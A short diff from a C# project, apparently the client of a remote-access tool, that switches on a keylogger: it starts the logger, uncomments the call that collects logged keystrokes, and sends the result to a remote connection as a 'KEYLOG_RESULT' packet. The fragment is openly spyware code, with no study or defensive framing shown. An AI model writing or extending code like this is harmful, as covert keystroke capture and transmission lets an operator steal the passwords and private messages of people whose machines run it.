@@ -77,9 +77,11 @@ namespace Client
 
             if (!Running) return;
 
+            keyloggerUpdate.ChangeRunningState();
+
             string keyloggerResult;
 
-           //keyloggerResult = keyloggerUpdate.UpdateLogs();
+           keyloggerResult = keyloggerUpdate.UpdateLogs();
 
 
             _connection.Send(new Packet { Command = "KEYLOG_RESULT", Data = keyloggerResult }); // will not hang the program because 50 ms sending ???
